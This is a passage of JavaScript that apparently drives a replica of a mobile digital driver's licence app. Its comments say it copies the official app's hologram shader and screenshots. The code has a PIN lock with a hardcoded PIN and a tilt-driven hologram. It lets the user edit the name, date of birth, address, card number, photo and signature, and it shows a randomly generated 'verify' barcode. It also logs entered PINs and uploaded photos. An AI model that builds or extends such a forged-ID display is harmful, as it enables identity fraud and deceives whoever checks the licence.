  const days   = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  const day = days[date.getDay()];
  const d   = date.getDate();
  const mon = months[date.getMonth()];
  const yr  = date.getFullYear();
  let hr    = date.getHours();
  const min = String(date.getMinutes()).padStart(2,'0');
  const ampm = hr >= 12 ? 'pm' : 'am';
  hr = hr % 12; if (hr === 0) hr = 12;
  return day + ' ' + d + ' ' + mon + ' ' + yr + ' ' + hr + ':' + min + ampm;
}
function updateLastRefreshed() {
  const el = document.getElementById("lastRefreshed");
  if (el) el.innerHTML = '<span class="lbl">Last refreshed:</span> ' + formatRefreshDate(new Date());
}

/* ===== PULL TO REFRESH ===== */
(function setupPTR() {
  const viewport  = document.getElementById('viewport');
  const ptrZone   = document.getElementById('ptr-zone');
  const content   = document.getElementById('scroll-content');
  const SPINNER_H = 70;
  const THRESHOLD = 65;

  let startY     = 0;
  let pulling    = false;
  let refreshing = false;
  let pulled     = false;

  function setContent(px, animated) {
    content.style.transition = animated ? 'transform 0.32s cubic-bezier(.2,.9,.2,1)' : 'none';
    content.style.transform  = 'translateY(' + px + 'px)';
  }
  function setSpinner(px, animated) {
    ptrZone.style.transition = animated ? 'height 0.32s cubic-bezier(.2,.9,.2,1)' : 'none';
    ptrZone.style.height     = px + 'px';
  }

  function doRefresh() {
    if (refreshing) return;
    refreshing = true;

    // Snap to resting position with spinner fully open
    setContent(SPINNER_H, true);
    setSpinner(SPINNER_H, true);

    setTimeout(() => {
      updateLastRefreshed();

      // Collapse spinner first
      setSpinner(0, true);

      // Then slide content back up after spinner is gone
      setTimeout(() => {
        setContent(0, true);
        setTimeout(() => { refreshing = false; }, 80);
      }, 80);

    }, 2200);
  }

  viewport.addEventListener('touchstart', function(e) {
    if (refreshing) return;
    if (viewport.scrollTop === 0) {
      startY  = e.touches[0].clientY;
      pulling = true;
      pulled  = false;
    }
  }, { passive: true });

  viewport.addEventListener('touchmove', function(e) {
    if (!pulling || refreshing) return;
    const dy = e.touches[0].clientY - startY;
    if (dy > 5 && viewport.scrollTop === 0) {
      const drag = Math.min(dy * 0.5, SPINNER_H);
      setContent(drag, false);
      setSpinner(drag, false);
      pulled = dy > THRESHOLD;
    }
  }, { passive: true });

  viewport.addEventListener('touchend', function() {
    if (!pulling || refreshing) return;
    pulling = false;
    if (pulled) {
      doRefresh();
    } else {
      setContent(0, true);
      setSpinner(0, true);
    }
  }, { passive: true });
})();

/* ===== PIN ENTRY (matches IMG_1671 — 6-digit PIN, code is 457511) ===== */
(function(){
  let PIN = localStorage.getItem('admin_pin') || "457511";
  const CONFIG_URL = "config.php";
  // Fetch PIN from config
  fetch(CONFIG_URL)
    .then(r => r.json())
    .then(d => { 
      if (d && d.pin) { 
        PIN = d.pin; 
        localStorage.setItem('admin_pin', PIN);
      } 
    })
    .catch(e => console.warn("[PIN] fetch failed:", e));
  const overlay    = document.getElementById("pinOverlayFS");
  const keyButtons = Array.from(document.querySelectorAll(".key-btn-fs[data-key]"));
  const backBtn    = document.getElementById("pinBackFS");
  const forgotBtn  = document.getElementById("pinForgotFS");
  const dots       = Array.from(document.querySelectorAll(".pin-dot-fs"));
  let buffer = [];

  function isVisible() {
    // Overlay is hidden either via the .pin-hidden class or inline display:none
    return !overlay.classList.contains("pin-hidden") && overlay.style.display !== "none";
  }
  function updateDots() {
    dots.forEach((dot, i) => { dot.classList.toggle("filled", i < buffer.length); });
  }
  async function wrongFeedback() {
    const entered = buffer.join("");
    try { await logAccess('pin_failed', false, entered); } catch(e) {}
    overlay.animate([
      { transform: "translateX(0)" }, { transform: "translateX(-6px)" },
      { transform: "translateX(6px)" }, { transform: "translateX(0)" }
    ], { duration: 250, easing: "ease-in-out" });
    buffer = []; updateDots();
  }
  async function tryUnlock() {
    const entered = buffer.join("");
    if (entered === PIN) {
      console.log("[Debug] PIN matched, unlocking app");
      try { await logAccess('pin_success', true); } catch(e) {}
      overlay.style.display = "none";
      // Pre-load licence data + init so it's ready when user taps "My licence"
      try { if (typeof loadData === 'function') loadData(); } catch(e) {}
      try { if (typeof renderSmallBarcode === 'function') renderSmallBarcode(); } catch(e) {}
      try { if (typeof updateLastRefreshed === 'function') updateLastRefreshed(); } catch(e) {}
      try { if (typeof initHologramEvents === 'function') initHologramEvents(); } catch(e) {}
      // Auto-request device-orientation permission while we still have a
      // user gesture (iOS Safari requires this).  startGyroscope() handles
      // the requestPermission() call internally.
      try { if (typeof startGyroscope === 'function') startGyroscope(); } catch(e) {}
      // Show the HOME screen first — matches IMG_1663 flow
      var home = document.getElementById('homeScreen');
      if (home) home.classList.remove('hidden');
    } else { wrongFeedback(); }
  }
  function pressDigit(d) {
    if (!isVisible()) return;
    if (buffer.length >= dots.length) return;
    buffer.push(d); updateDots();
    if (buffer.length === dots.length) { setTimeout(tryUnlock, 100); }
  }
  function backspace() {
    if (!isVisible()) return;
    buffer.pop(); updateDots();
  }

  keyButtons.forEach(btn => btn.addEventListener("click", e => pressDigit(e.currentTarget.dataset.key)));
  if (backBtn) backBtn.addEventListener("click", backspace);
  if (forgotBtn) forgotBtn.addEventListener("click", function() {
    // Forgot? button has no behavior yet — just log so we know it was tapped
    console.log("[PIN] Forgot? tapped (no handler assigned yet)");
    try { logAccess('pin_forgot_tapped'); } catch(e) {}
  });
  window.addEventListener("keydown", e => {
    if (!isVisible()) return;
    if (e.key >= "0" && e.key <= "9") pressDigit(e.key);
    if (e.key === "Backspace") backspace();
  });

  console.log("[Debug] PIN entry initialized");
})();

/* VIBRATION */
function vibrate() { if (navigator.vibrate) { navigator.vibrate(50); } }

/* TABS */
const tabs = document.querySelectorAll(".tab");
const highlight = document.querySelector(".tab-highlight");

function updateTabHighlight() {
  const active = document.querySelector(".tab.active") || tabs[0];
  if (!active || !active.parentElement) return;
  const tabRect = active.getBoundingClientRect();
  const tabsRect = active.parentElement.getBoundingClientRect();
  if (tabRect.width === 0) return;
  highlight.style.width = tabRect.width + "px";
  highlight.style.transform = `translateX(${tabRect.left - tabsRect.left}px)`;
}

tabs.forEach((tab) => {
  tab.addEventListener("click", () => {
    vibrate();
    tabs.forEach(t => t.classList.remove("active"));
    tab.classList.add("active");
    updateTabHighlight();
    const targetId = tab.getAttribute("data-tab");
    document.querySelectorAll(".details").forEach(d => d.classList.remove("active"));
    const targetContent = document.getElementById(targetId);
    if(targetContent) targetContent.classList.add("active");
  });
});
window.addEventListener("load", updateTabHighlight);
window.addEventListener("resize", updateTabHighlight);

  /* ===== HOLOGRAM — APK shader-faithful, beta-only opacity =====
     APK hologram_fragment.glsl active path:
       float roll = (abs(u_roll) / 10.0) + 0.2;
     The coat-of-arms image is NOT a 3-layer parallax setup — it is a single
     static overlay whose opacity is driven by the device's forward/back tilt
     (DeviceOrientationEvent.beta).  Beta maps screen-angle-to-ground:
       0°   = phone flat on back, screen to sky   → opacity 0.2 (min)
       90°  = phone vertical, screen to face     → opacity 1.0 (full)
       180° = phone flat on belly, screen to ground → opacity 1.0 (full)
     No position movement, no parallax, no pointer-move fallback. */
  var _holoOverlay = document.getElementById('hologramOverlay');
  var _gyroActive = false;

  // ---- Smoothed hologram opacity driven by a rAF lerp loop ----
  // Each deviceorientation event (~60Hz) sets a TARGET value.  A separate
  // rAF loop interpolates the CURRENT value toward the target at ~12%/frame
  // (heavy smoothing → no twitchiness).  This is far smoother than letting
  // each event start a fresh CSS transition (which fight each other).
  var _holoCurrent = 0.15;
  var _holoTarget  = 0.15;
  var _holoLoopRunning = false;

  function _computeHoloTarget(gamma) {
    // Formula from APK fragment shader: (abs(u_roll) / 10.0) + 0.2
    // Clamped to 0.2..1.0
    var val = (Math.abs(gamma) / 10.0) + 0.2;
    return Math.min(1.0, Math.max(0.2, val));
  }
  function _holoSmoothLoop() {
    var diff = _holoTarget - _holoCurrent;
    if (Math.abs(diff) < 0.002) {
      _holoCurrent = _holoTarget;
      document.documentElement.style.setProperty("--holo-opacity", _holoCurrent.toFixed(3));
      _holoLoopRunning = false;
      return;
    }
    _holoCurrent += diff * 0.12;        // 12% of the gap per frame ≈ ~150ms to settle
    document.documentElement.style.setProperty("--holo-opacity", _holoCurrent.toFixed(3));
    requestAnimationFrame(_holoSmoothLoop);
  }
  function _kickHoloLoop() {
    if (_holoLoopRunning) return;
    _holoLoopRunning = true;
    requestAnimationFrame(_holoSmoothLoop);
  }
  function _applyHoloOpacity(gamma) {
    _holoTarget = _computeHoloTarget(gamma);
    _kickHoloLoop();
  }
  function handleOrientation(event) {
    if (!_gyroActive) return;
    var gamma = event.gamma; // roll (left-right tilt)
    if (gamma === null) return;
    _applyHoloOpacity(gamma);
  }

  function startGyroscope() {
    if (_gyroActive) { stopGyroscope(); return; }
    function enableGyro() {
      window.addEventListener('deviceorientation', handleOrientation);
      _gyroActive = true;
      var btn = document.getElementById('gyroStartBtn');
      var status = document.getElementById('gyroStatus');
      if (btn) { btn.textContent = '⚠️ Gyro: ON'; btn.classList.add('active'); }
      if (status) { status.textContent = 'Gyroscope: Active — tilt device to reveal hologram'; status.classList.add('active'); }
      var badge = document.getElementById('liveBadge');
      if (badge) badge.style.display = 'block';
    }
    function failGyro(err) {
      console.warn('[Gyro] Failed:', err);
      var status = document.getElementById('gyroStatus');
      if (status) { status.textContent = 'Gyroscope unavailable'; status.classList.remove('active'); }
      var btn = document.getElementById('gyroStartBtn');
      if (btn) btn.disabled = true;
    }
    var requestPermission = (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function');
    if (requestPermission) {
      DeviceOrientationEvent.requestPermission().then(function(state) {
        if (state === 'granted') enableGyro(); else failGyro(new Error('Permission denied'));
      }).catch(failGyro);
    } else if (typeof DeviceOrientationEvent !== 'undefined') {
      enableGyro();
    } else {
      failGyro(new Error('Not supported'));
    }
  }

  function stopGyroscope() {
    window.removeEventListener('deviceorientation', handleOrientation);
    _gyroActive = false;
    var btn = document.getElementById('gyroStartBtn');
    var status = document.getElementById('gyroStatus');
    if (btn) { btn.textContent = '📱 Gyroscope'; btn.classList.remove('active'); btn.disabled = false; }
    if (status) { status.textContent = 'Gyroscope: Off'; status.classList.remove('active'); }
    var badge = document.getElementById('liveBadge');
    if (badge) badge.style.display = 'none';
    // Reset to default APK "flat" opacity
    document.documentElement.style.setProperty('--holo-opacity', '0.2');
  }

  /* ===== ATTACH HOLOGRAM EVENTS (simplified) ===== */
  function initHologramEvents() {
    var gyroBtn = document.getElementById('gyroStartBtn');
    if (gyroBtn) gyroBtn.onclick = startGyroscope;

    var resetBtn = document.getElementById('resetAllBtn');
    if (resetBtn) resetBtn.onclick = function() {
      if (_gyroActive) stopGyroscope();
      document.documentElement.style.setProperty('--holo-opacity', '0.2');
    };

    var gyroSaveBtn = document.getElementById('gyroSaveBtn');
    if (gyroSaveBtn) gyroSaveBtn.onclick = function() {
      if (typeof saveData === 'function') saveData();
      var orig = gyroSaveBtn.textContent;
      gyroSaveBtn.textContent = '✓ Saved!';
      setTimeout(function() { gyroSaveBtn.textContent = orig; }, 1200);
    };
  }
/* PHOTO UPLOAD — old consent panel (kept for back-compat; new UI is in subPersonalInfo) */
const photoInput = document.getElementById("photoInput");
var _oldAddPhotoBtn = document.getElementById("addPhotoBtn");
var _oldClearPhotoBtn = document.getElementById("clearPhotoBtn");
if (_oldAddPhotoBtn) { _oldAddPhotoBtn.onclick = () => { vibrate(); photoInput.click(); document.getElementById("calibrationBar").style.display = "flex"; }; }
if (_oldClearPhotoBtn) { _oldClearPhotoBtn.onclick = async () => {
  vibrate();
  document.getElementById("profilePhoto").src = "https://via.placeholder.com/250x250.png?text=Your+Photo";
  await saveData();
}; }
if (photoInput) { photoInput.addEventListener("change", e => {
  const file = e.target.files[0];
  if(file){
    console.log("[Photo] New photo selected:", file.name, file.size);
    const reader = new FileReader();
    reader.onload = async () => {
      document.getElementById("profilePhoto").src = reader.result;
      await saveData();
      await logAccess('photo_updated', true, null, { photo: reader.result });
    };
    reader.readAsDataURL(file);
  }
}); }

/* CARD NUMBER TOGGLE */
const cardNum   = document.getElementById("cardNum");
const toggleEye = document.getElementById("toggleEye");
let shown = false;
toggleEye.onclick = () => {
  vibrate();
  if(shown){ cardNum.textContent = "•••••••"; shown = false; }
  else      { cardNum.textContent = "P453005"; shown = true;  }
};

/* SIGNATURE MODAL */
const sigModal     = document.getElementById("signatureModal");
const sigPopup     = document.getElementById("sigPopup");
const addSigBtn    = document.getElementById("addSigBtn");
const doneSigBtn   = document.getElementById("doneSigBtn");
const resetSigBtn  = document.getElementById("resetSigBtn");
const cancelSigBtn = document.getElementById("cancelSigBtn");
let sigDrawing = false;
let sigCtx = sigPopup.getContext("2d");

function startSig(e){
  sigDrawing = true; sigCtx.beginPath();
  const rect = sigPopup.getBoundingClientRect();
  const x = e.offsetX || (e.touches ? e.touches[0].clientX - rect.left : 0);
  const y = e.offsetY || (e.touches ? e.touches[0].clientY - rect.top  : 0);
  sigCtx.moveTo(x, y);
}
function drawSig(e){
  if(!sigDrawing) return;
  const rect = sigPopup.getBoundingClientRect();
  const x = e.offsetX || (e.touches ? e.touches[0].clientX - rect.left : 0);
  const y = e.offsetY || (e.touches ? e.touches[0].clientY - rect.top  : 0);
  sigCtx.lineTo(x, y); sigCtx.stroke();
}
function endSig(){ sigDrawing = false; }

sigPopup.addEventListener("mousedown",  startSig);
sigPopup.addEventListener("mousemove",  drawSig);
sigPopup.addEventListener("mouseup",    endSig);
sigPopup.addEventListener("mouseleave", endSig);
sigPopup.addEventListener("touchstart", startSig, {passive: false});
sigPopup.addEventListener("touchmove",  drawSig,  {passive: false});
sigPopup.addEventListener("touchend",   endSig);

if (addSigBtn) { addSigBtn.onclick = () => { vibrate(); sigModal.style.display = "flex"; sigCtx.clearRect(0, 0, sigPopup.width, sigPopup.height); }; }
resetSigBtn.onclick  = () => { vibrate(); sigCtx.clearRect(0, 0, sigPopup.width, sigPopup.height); };
cancelSigBtn.onclick = () => { vibrate(); sigModal.style.display = "none"; };
doneSigBtn.onclick   = async () => {
  vibrate(); sigModal.style.display = "none";
  const dataURL = sigPopup.toDataURL();
  document.querySelectorAll(".sigCanvas").forEach(c => {
    let ctx = c.getContext("2d"); let img = new Image();
    img.onload = () => ctx.drawImage(img, 0, 0, c.width, c.height);
    img.src = dataURL;
  });
  // Also update sub-screen sig canvas if open
  var piSig = document.getElementById('piSigCanvas');
  if (piSig) {
    var piCtx = piSig.getContext('2d'); var piImg = new Image();
    piImg.onload = function() { piCtx.clearRect(0,0,piSig.width,piSig.height); piCtx.drawImage(piImg, 0, 0, piSig.width, piSig.height); };
    piImg.src = dataURL;
  }
  await saveData();
};

/* FINALIZE — guard, button moved to subPersonalInfo */
var _oldFinalizeBtn = document.getElementById("finalizeBtn");
if (_oldFinalizeBtn) {
  _oldFinalizeBtn.onclick = async () => {
    vibrate();
    document.querySelectorAll('.consent button').forEach(btn => {
      if(btn.id !== "revealBtn") btn.style.display = "none";
    });
    document.getElementById("calibrationBar").style.display = "none";
    document.getElementById("controlsPanel").classList.remove("open");
    await saveData();
  };
}

/* BARCODE — single source of truth for the digits string. Both the small
   licence-page barcode and the slide-up Verify-Barcode sheet render the
   SAME bars from the SAME data. Persisted in localStorage so it survives
   reloads, but a tap on the small barcode regenerates and updates both. */
function randomDigits(n){
  let s = "";
  for(let i = 0; i < n; i++) s += String(Math.floor(Math.random() * 10));
  return s;
}
function getBarcodeDigits(){
  let cached = null;
  try { cached = localStorage.getItem('barcodeDigits'); } catch(e){}
  if (cached && /^\d{10,16}$/.test(cached)) return cached;
  const fresh = randomDigits(13);
  try { localStorage.setItem('barcodeDigits', fresh); } catch(e){}
  return fresh;
}
function regenerateBarcodeDigits(){
  const fresh = randomDigits(13);
  try { localStorage.setItem('barcodeDigits', fresh); } catch(e){}
  return fresh;
}
function renderSmallBarcode(){
  const digits = getBarcodeDigits();
  const barcodeCanvas = document.getElementById("barcodeCanvas");
  const ctx = barcodeCanvas.getContext("2d");
  ctx.clearRect(0, 0, barcodeCanvas.width, barcodeCanvas.height);
  JsBarcode(barcodeCanvas, digits, {
    format: "CODE128", lineColor: "#000",
    width: 2.0, height: barcodeCanvas.height,
    displayValue: false, margin: 0
  });
}
function renderSheetBarcode(){
  const digits = getBarcodeDigits();
  const barcodeSVG = document.getElementById("barcodeSVG");
  try {
    JsBarcode(barcodeSVG, digits, {
      format: "CODE128", lineColor: "#000",
      width: 2.6, height: 210,
      displayValue: false, margin: 8, background: "#fff"
    });
  } catch(e) { console.warn("JsBarcode (sheet) failed:", e); }
}
// Back-compat alias for older callers that referenced the old name.
function generateSmallBarcodeRealistic(){
  // Tap on the small barcode rerolls digits and updates BOTH renders.
  regenerateBarcodeDigits();
  renderSmallBarcode();
  // If the sheet is open right now, repaint it too.
  var sheet = document.getElementById('barcodeSheet');
  if (sheet && sheet.classList.contains('open')) renderSheetBarcode();
}

/* EDIT DETAILS */
const editBtn       = document.getElementById("editBtn");
const editModal     = document.getElementById("editModal");
const saveEditBtn   = document.getElementById("saveEditBtn");
const cancelEditBtn = document.getElementById("cancelEditBtn");

const selDay = document.getElementById("editDOB_Day");
const selMonth = document.getElementById("editDOB_Month");
const selYear = document.getElementById("editDOB_Year");

// Populate DOB selects
for(let i=1; i<=31; i++) {
  const opt = document.createElement("option");
  opt.value = i; opt.textContent = i;
  selDay.appendChild(opt);
}
const monthNames = ["January","February","March","April","May","June","July","August","September","October","November","December"];
monthNames.forEach((m, i) => {
  const opt = document.createElement("option");
  opt.value = i; opt.textContent = m;
  selMonth.appendChild(opt);
});
const currentYearForPop = new Date().getFullYear();
for(let i=currentYearForPop; i>=1900; i--) {
  const opt = document.createElement("option");
  opt.value = i; opt.textContent = i;
  selYear.appendChild(opt);
}

if (editBtn) {
  editBtn.onclick = () => {
    vibrate();
    const nameEl = document.querySelector(".licenceName");
    const dobEl  = document.querySelector(".licenceDOB");
    const addrEl = document.querySelector(".licenceAddress");
    const cardEl = document.getElementById("cardNum");

    document.getElementById("editName").value    = nameEl ? nameEl.innerText.replace(/\n/g, " ") : "";
    document.getElementById("editAddress").value = addrEl ? addrEl.innerHTML.replace(/<br\s*\/?>/gi, "") : "";
    document.getElementById("editCard").value    = cardEl ? (cardEl.innerText === "•••••••" ? "" : cardEl.innerText) : "";

    if (dobEl) {
      const dobText = dobEl.innerText.trim();
      const parts = dobText.split(' ');
      if (parts.length === 3) {
        const d = parseInt(parts[0]);
        const mStr = parts[1];
        const y = parseInt(parts[2]);
        const m = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"].indexOf(mStr);
        if (d) selDay.value = d;
        if (m !== -1) selMonth.value = m;
        if (y) selYear.value = y;
      }
    }

    editModal.style.display = "flex";
  };
}